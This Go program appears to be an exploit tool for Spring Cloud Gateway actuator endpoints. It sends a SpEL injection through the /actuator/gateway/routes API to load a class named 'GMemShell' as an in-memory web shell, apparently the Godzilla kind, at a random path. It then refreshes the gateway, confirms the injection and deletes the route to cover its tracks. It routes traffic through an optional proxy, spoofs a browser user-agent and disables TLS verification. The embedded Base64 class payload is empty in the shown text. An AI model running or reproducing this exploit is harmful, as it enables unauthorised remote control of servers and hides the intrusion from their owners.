package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func main() {
	var (
		host  string
		proxy string
	)
	flag.StringVar(&host, "u", "", "url, eg: http://127.0.0.1:8080")
	flag.StringVar(&proxy, "p", "", "proxy, eg: socks5://ip:port")
	flag.Parse()
	if host == "" {
		flag.Usage()
		return
	}
	parse, err := url.Parse(host)
	if err != nil {
		fmt.Println("parse host error ", err)
		return
	}
	host = parse.Scheme + "://" + parse.Host
	err = inject(host, proxy)
	if err != nil {
		fmt.Println("error ", err)
		return
	}

}

func inject(host string, proxy string) error {
	body := "{\"id\":\"{id}\",\"predicates\":[{\"name\":\"Path\",\"args\":{\"_genkey_0\":\"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('ms.GMemShell',T(org.springframework.util.Base64Utils).decodeFromString(''),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,'/{path}')}\"}}],\"filters\":[],\"uri\":\"https://www.uri-destination.org\",\"order\":0}"
	client, err := InitHttpClient(proxy)
	if err != nil {
		return nil
	}

	shell := randomStr(6)
	body = strings.Replace(body, "{id}", randomStr(32), 1)
	body = strings.Replace(body, "{path}", shell, 1)
	p := randomStr(8)
	path1 := host + "/actuator/gateway/routes/" + p
	path2 := host + "/actuator/gateway/refresh"
	_, err = client.Post(path1, "application/json", strings.NewReader(body))
	if err != nil {
		return err
	}
	_, err = client.Post(path2, "application/x-www-form-urlencoded", nil)
	if err != nil {
		return err
	}
	resp, err := client.Get(path1)
	defer resp.Body.Close()
	reply, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	request, err := http.NewRequest("DELETE", path1, nil)
	if err != nil {
		return err
	}
	_, err = client.Do(request)
	if err != nil {
		return err
	}
	_, err = client.Post(path2, "application/x-www-form-urlencoded", nil)
	if err != nil {
		return err
	}
	if resp.StatusCode == 200 && strings.Contains(string(reply), p) {
		fmt.Printf("inject godzilla memory shell success, path: %s/%s\n", host, shell)
	}
	return nil
}

// https://stackoverflow.com/a/51326487

type MyRoundTripper struct {
	r http.RoundTripper
}

func (mrt MyRoundTripper) RoundTrip(r *http.Request) (*http.Response, error) {
	r.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15")
	return mrt.r.RoundTrip(r)
}

func InitHttpClient(proxy string) (*http.Client, error) {

	dialer := &net.Dialer{
		Timeout:   5 * time.Second,
		KeepAlive: 15 * time.Second,
	}

	tr := &http.Transport{
		DialContext:         dialer.DialContext,
		MaxIdleConns:        1000,
		IdleConnTimeout:     15 * time.Second,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		TLSHandshakeTimeout: 5 * time.Second,
	}

	if proxy != "" {
		parse, err := url.Parse(proxy)
		if err != nil {
			return nil, err
		}
		tr.Proxy = http.ProxyURL(parse)
	}
	client := &http.Client{
		Transport: MyRoundTripper{
			r: tr,
		},
		Timeout: 5 * time.Second,
	}

	return client, nil
}

func randomStr(n int) string {
	letterBytes := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	randSource := rand.New(rand.NewSource(time.Now().Unix()))
	const (
		letterIdxBits = 6                    // 6 bits to represent a letter index
		letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
		letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
	)
	randBytes := make([]byte, n)
	for i, cache, remain := n-1, randSource.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = randSource.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			randBytes[i] = letterBytes[idx]
			i--
		}
		cache >>= letterIdxBits
		remain--
	}
	return string(randBytes)
}
